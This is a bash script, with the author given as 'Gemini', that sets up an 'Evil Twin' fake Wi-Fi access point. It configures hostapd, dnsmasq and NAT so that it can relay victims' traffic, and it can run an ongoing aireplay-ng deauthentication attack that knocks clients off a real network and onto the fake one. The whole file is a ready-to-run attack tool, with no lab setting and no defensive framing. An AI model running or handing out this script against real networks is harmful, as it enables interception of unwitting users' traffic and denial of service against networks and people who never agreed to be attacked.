#!/bin/bash

# ====================================================================================
# Evil Twin AP Script
#
# Creates a fake Access Point and routes its traffic to the internet through another
# wireless interface. It also includes a deauthentication attack to encourage
# clients to connect to the fake AP.
#
# Author: Gemini
# ====================================================================================

# --- Configuration ---
# Interface connected to the REAL internet (e.g., your RPi's built-in WiFi)
INTERNET_IF="wlan0"

# Interface for the FAKE Access Point (e.g., your Alfa AWUS1900)
AP_IF="wlan1"

# AP Configuration
AP_ESSID="Free_WiFi"
AP_CHANNEL=6

# Deauth attack configuration
# Leave TARGET_BSSID empty to select interactively
TARGET_BSSID=""
# Leave TARGET_CLIENT empty to deauth all clients of the target AP
TARGET_CLIENT=""

# --- Script Functions ---

function cleanup() {
    echo "[*] Cleaning up..."
    # Kill background processes
    killall hostapd 2>/dev/null
    killall dnsmasq 2>/dev/null
    killall aireplay-ng 2>/dev/null
    
    # Flush iptables
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    
    # Disable IP forwarding
    sysctl -w net.ipv4.ip_forward=0 > /dev/null
    
    # Bring interfaces down and up to reset state
    ifconfig $AP_IF down
    ifconfig $AP_IF up
    
    echo "[*] Cleanup complete."
    exit 0
}

# Trap Ctrl+C and call cleanup
trap cleanup SIGINT

# --- Main Script ---

# Check for root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root." 
   exit 1
fi

# 1. Configure the AP Interface
echo "[*] Configuring AP interface: $AP_IF"
ifconfig $AP_IF down
ifconfig $AP_IF up
ifconfig $AP_IF 192.168.42.1 netmask 255.255.255.0
sleep 1

# 2. Configure IP Forwarding and NAT
echo "[*] Configuring IP forwarding and NAT..."
# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1 > /dev/null
# Add NAT rule to route traffic from AP to internet interface
iptables --table nat --append POSTROUTING --out-interface $INTERNET_IF -j MASQUERADE
iptables --append FORWARD --in-interface $AP_IF -j ACCEPT
sleep 1

# 3. Start DHCP and DNS Server
echo "[*] Starting DHCP/DNS server (dnsmasq)..."
dnsmasq -C ./dnsmasq.conf
sleep 2

# 4. Start the Fake Access Point
echo "[*] Starting Fake Access Point (hostapd)..."
# We need to sed the config file to set the interface and SSID
sed -i "s/^interface=.*/interface=$AP_IF/" hostapd.conf
sed -i "s/^ssid=.*/ssid=$AP_ESSID/" hostapd.conf
sed -i "s/^channel=.*/channel=$AP_CHANNEL/" hostapd.conf
hostapd ./hostapd.conf &
sleep 5

# 5. Start Deauthentication Attack (Optional)
if [ -n "$TARGET_BSSID" ]; then
    echo "[*] Starting deauthentication attack..."
    # Put AP interface into monitor mode on a new virtual interface
    iw dev $AP_IF interface add mon0 type monitor
    ifconfig mon0 up
    
    DEAUTH_CMD="aireplay-ng --deauth 0 -a $TARGET_BSSID"
    if [ -n "$TARGET_CLIENT" ]; then
        DEAUTH_CMD="$DEAUTH_CMD -c $TARGET_CLIENT"
    fi
    
    # Run deauth attack in the background
    $DEAUTH_CMD mon0 &
    echo "[*] Deauth attack running in the background."
else
    echo "[*] No TARGET_BSSID set. Skipping deauthentication attack."
fi

echo "[+] Evil Twin AP is up and running."
echo "    ESSID: $AP_ESSID"
echo "    IP Range: 192.168.42.100 - 192.168.42.150"
echo "    Press Ctrl+C to stop the script and clean up."

# Wait forever until user presses Ctrl+C
wait
